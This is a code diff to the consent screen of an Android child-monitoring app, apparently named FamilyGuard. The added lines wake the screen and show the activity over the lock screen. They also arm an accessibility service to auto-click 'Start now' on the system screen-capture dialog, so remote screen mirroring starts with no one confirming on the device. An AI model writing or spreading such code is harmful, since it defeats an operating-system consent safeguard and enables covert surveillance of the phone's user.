@@ -1,7 +1,9 @@
 package com.familyguard.child.ui
 
 import android.content.Intent
+import android.os.Build
 import android.os.Bundle
+import android.os.SystemClock
 import androidx.activity.ComponentActivity
 import androidx.activity.result.contract.ActivityResultContracts
 import androidx.core.content.ContextCompat
@@ -24,10 +26,21 @@ class ConsentActivity : ComponentActivity() {
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
+        // Show even over the lock screen so a reboot + remote mirror request never
+        // needs the child to unlock the phone.
+        if (Build.VERSION.SDK_INT >= 27) {
+            runCatching {
+                setShowWhenLocked(true)
+                setTurnScreenOn(true)
+            }
+        }
         if (!Store.paired || Store.released || MirrorManager.hasProjection) {
             finish()
             return
         }
+        // Arm the accessibility auto-confirm: EnforcementService will click
+        // "Start now" on the system dialog within this window.
+        Store.projectionRequestedAt = SystemClock.elapsedRealtime()
         val mgr = getSystemService(MEDIA_PROJECTION_SERVICE) as android.media.projection.MediaProjectionManager
         runCatching { projLauncher.launch(mgr.createScreenCaptureIntent()) }.onFailure { finish() }
     }
